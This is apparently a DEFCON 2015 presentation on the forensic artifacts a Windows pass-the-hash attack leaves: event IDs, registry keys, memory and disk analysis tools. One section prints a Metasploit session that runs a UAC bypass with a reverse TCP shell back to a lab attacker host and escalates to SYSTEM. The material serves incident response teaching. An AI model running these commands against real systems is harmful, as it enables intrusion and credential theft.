# Forensic Artifacts from a Pass the Hash (PTH) Attack

## Author: Gerard Laygui

**Disclaimer:** The views and opinions expressed in this presentation are those of the author and do not necessarily represent the official policy or position of the company the author works for.

## What is a Hash?

A hash function is any function that can map digital data of arbitrary size to digital data of fixed size. In the context of Windows, passwords are stored in either the LANMAN (LM) hash or NT LAN Manager (NTLM) hash format.

## Where Are Hashes Stored?

- **Security Accounts Manager (SAM) database**
- **Local Security Authority Subsystem (LSASS) process memory**
- **Domain Active Directory Database (domain controllers only)**
- **Credential Manager (CredMan) store**
- **LSA Secrets in the registry**

## Hash Examples

- **Plaintext**: `password`
- **LM Hash**: `E52CAC67419A9A224A3B108F3FA6CB6D`
- **NTLM Hash**: `8846F7EAEE8FB117AD06BDD830B7586C`

## Pass the Hash (PTH)

Pass the hash is a hacking technique that allows an attacker to authenticate to a remote server or service by using the underlying NTLM or LanMan hash of a user's password, instead of requiring the associated plaintext password. In this case, the hash acts as the password.

## Demo Environment - Logging Changes

- **Audit logon events**: Success & Failure
- **Audit account management**: Success & Failure
- **Audit account logon events**: Success & Failure
- **Audit process tracking**: Success & Failure
- **Audit system events**: Success & Failure
- **Increase log file sizes**

For Microsoft Audit Policy Recommendations, visit: [Microsoft Audit Policy Recommendations](https://technet.microsoft.com/en-us/library/dn487457.aspx)

## Demo Domain

- **Client 1**: Windows 7
- **Client 2**: Member Server (W2K8 R2)
- **Member Server 2**: W2K12
- **Domain Controller**: W2K12
- **Users**: ImaUser, ImaDomainAdmin
- **SIDs**: S-1-5-21domain-500, S-1-5-21domain-500
- **Windows 2012 Native Mode**
- **Domain Name**: OHNOES.INTERNAL

## Pass the Hash Attack Sequence

1. **Compromise**
2. **Elevate Privilege**
3. **Scrape Hashes**
4. **Recon**
5. **Leave Backdoor (Optional)**
6. **Crack Hashes (Optional)**
7. **Pass The Hash**
8. **Recon**
9. **Scrape Hashes**
10. **Elevate Privilege**
11. **Extract Active Directory**

## Demo Pass the Hash - Forensic Evidence

### Volatile Data
- **At Least**: Network (pcap, routes, netstat), Process List
- **Best**: RAM Memory Captures, hiberfil.sys
- **VMWare**: Suspend VM, use vmem file

### Non-Volatile Data
- **At Least**: Event Logs, Registry, Systeminfo
- **Best**: Disk Images
- **VMWare**: Use VMDK

## Analysis Tools - Volatile Data

- **Dump Memory**: HBGary - FDPro, Mandiant Memoryze
- **Analyze Memory**: Volatility (Free), HBGary Responder Pro

## Analysis Tools - Non-Volatile Data

- **Creating Disk Images**: Linux `dd`, Encase, FTK
- **Analyze Disk Images**: The Sleuth Kit / Autopsy, Log2Timeline, Encase, FTK

## Compromise Indicators

- **Windows Security Event Log (Process Audit Success)**
  - **Security Event ID 4688**: Process Creation
- **Prefetch (Disk Artifact)**: Time stamps reveal when a program was launched (Note: No artifacts if using SSD or Windows Server OS)
- **Shim Cache**: Registry (Regripper), Memory (Volatility - shimcache switch)
- **Memory - Volatility**: Malfind command

## Backdoor Indicators

- **Windows Security Event Log - Persistence**
  - **Security Event ID 4720**: User account created
  - **Security Event ID 4732**: User added to groups
- **Registry (Regripper)**:
  - **Run Keys**:
    - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
    - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
  - **Service Install Date**

## Privilege Escalation

To scrape hashes, the attacker needs to change the security context from a regular user to Local System (SID S-1-5-18).

### Example Using Kali

1. **Compromise the system using a Java exploit**.
2. **Use Meterpreter to escalate privileges**:
   ```sh
   meterpreter > run post/windows/gather/win_privs
   meterpreter > background
   msf exploit(java_signed_applet) > use exploit/windows/local/bypassuac
   msf exploit(bypassuac) > set SESSION 1
   SESSION => 1
   msf exploit(bypassuac) > set payload windows/meterpreter/reverse_tcp
   payload => windows/meterpreter/reverse_tcp
   msf exploit(bypassuac) > set LHOST 10.1.1.251
   LHOST => 10.1.1.251
   msf exploit(bypassuac) > set LPORT 8088
   LPORT => 8088
   msf exploit(bypassuac) > exploit
   meterpreter > getuid
   Server username: OHNOES\ImaUser
   meterpreter > getsystem
   ...got system (via technique 1).
   meterpreter > getuid
   Server username: NT AUTHORITY\SYSTEM
   ```

## Scraping Hashes

- **Service Install and Process Start**
- **Volatility - consoles command**

## Cracking NT Hashes

- **Tools**: John The Ripper, OCLHashCat (GPU)
- **Example**: Ubuntu 14.04 with 8x AMD R9 290X GPUs can achieve 183,528,000,000 tries per second against NTLM, taking roughly 9 hours to crack an 8-character password.

## Recon

- **Volatility - consoles or cmdscan**

## APT-Style Recon

- **Event ID 4624**: Logon
- **Event ID 4634**: Logoff
- **Logon Types**:
  - **Type 2**: Interactive
  - **Type 3**: Network Logon
  - **Type 10**: Remote Interactive (RDP)

## Lateral Movement

- **Event ID 4624**: Logon
- **Event ID 4634**: Logoff
- **RDP Pivot**:
  - **Microsoft-Windows-TerminalServices-LocalSessionManager-Operational Event ID 21**: RDP Logon
  - **Microsoft-Windows-TerminalServices-LocalSessionManager-Operational Event ID 25**: RDP Reconnect
- **RDP Pivot Continued**:
  - **Default.rdp disk artifact**
  - **BMC Cache (bcache22.bmc)**

## Questions?

This slide deck and related links for the videos will be eventually posted on: [Cybersecology.com/DEFCON2015](http://Cybersecology.com/DEFCON2015)

Special thanks to Mike Landeck for allowing me to use his site!